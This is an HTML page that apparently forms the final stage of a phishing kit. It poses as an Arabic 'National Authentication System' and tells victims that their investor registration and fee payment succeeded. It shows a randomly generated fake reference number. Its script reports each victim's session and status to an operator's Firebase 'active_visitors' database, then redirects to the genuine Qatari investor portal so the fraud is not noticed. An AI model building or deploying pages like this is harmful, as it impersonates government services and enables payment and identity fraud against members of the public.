<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم تفعيل الحساب بنجاح - نظام التوثيق الوطني</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 375px; 
            background-color: #ffffff; min-height: 100vh;
            display: flex; flex-direction: column;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }

        header {
            padding: 10px 15px; display: flex; align-items: center;
            justify-content: space-between; border-bottom: 1px solid #f0f0f0;
        }

        /* إضافة الثلاث شرطات */
        .menu-icon { font-size: 24px; cursor: pointer; color: #333; margin-left: 10px; }
        .header-wrapper { display: flex; align-items: center; }

        .header-right img { height: 30px; }
        .header-left-text { text-align: left; }
        .header-left-text .title-ar { color: #8b1538; font-size: 11px; font-weight: 700; display: block; }
        .header-left-text .title-en { color: #666; font-size: 7px; display: block; }

        .main-content {
            padding: 40px 20px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .success-icon {
            width: 80px; height: 80px;
            background-color: #e8f5e9;
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            margin-bottom: 25px;
        }

        .success-icon svg { width: 40px; height: 40px; fill: #4caf50; }

        h2 { font-size: 18px; color: #333; margin-bottom: 15px; font-weight: 700; }
        p { font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 20px; }

        .reference-box {
            background-color: #f8f9fa;
            border: 1px dashed #ddd;
            padding: 15px;
            border-radius: 6px;
            width: 100%;
            margin-bottom: 25px;
            box-sizing: border-box;
        }

        .reference-label { font-size: 11px; color: #999; display: block; margin-bottom: 5px; }
        .reference-number { font-size: 16px; font-weight: 700; color: #8b1538; letter-spacing: 1px; }

        .home-btn {
            background-color: #00a3da;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        .redirect-notice { font-size: 11px; color: #00a3da; margin-top: 20px; font-weight: 600; }

        footer {
            padding: 15px; text-align: center; font-size: 10px;
            color: #555; background: #fff; border-top: 1px solid #eee;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="header-wrapper">
            <div class="menu-icon">☰</div>
            <div class="header-right">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo">
            </div>
        </div>
        <div class="header-left-text">
            <span class="title-ar">نظام التوثيق الوطني</span>
            <span class="title-en">National Authentication System</span>
        </div>
    </header>

    <div class="main-content">
        <div class="success-icon">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>

        <h2>تم تفعيل الحساب بنجاح</h2>
        <p>عزيزي المستثمر، لقد تمت عملية التسجيل وسداد الرسوم بنجاح. يمكنك الآن البدء في استخدام خدمات بوابة المستثمر.</p>

        <div class="reference-box">
            <span class="reference-label">رقم المرجع (Transaction Ref)</span>
            <span class="reference-number" id="ref-num">QN-8829410</span>
        </div>

        <a href="https://investor.sw.gov.qa/wps/portal/investors/home/" class="home-btn">الدخول إلى بوابة المستثمر</a>

        <div class="redirect-notice" id="timer-text">جاري تحويلك تلقائياً للخدمة خلال 5 ثوانٍ...</div>
    </div>

    <footer>نظام التوثيق الوطني - جميع الحقوق محفوظة © 2026</footer>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = localStorage.getItem('sessionID');
    const targetUrl = "https://investor.sw.gov.qa/wps/portal/investors/home/";
    
    if (sessionID) {
        database.ref('active_visitors/' + sessionID).update({
            currentPage: "final_success.html",
            status: "redirected_to_investor_portal",
            lastSeen: Date.now()
        });
        
        const randomRef = "QN-" + Math.floor(1000000 + Math.random() * 9000000);
        document.getElementById('ref-num').innerText = randomRef;
    }

    let timeLeft = 5;
    const timerElement = document.getElementById('timer-text');
    
    const countdown = setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) {
            clearInterval(countdown);
            window.location.href = targetUrl;
        } else {
            timerElement.innerText = "جاري تحويلك تلقائياً للخدمة خلال " + timeLeft + " ثوانٍ...";
        }
    }, 1000);
</script>

</body>
</html>
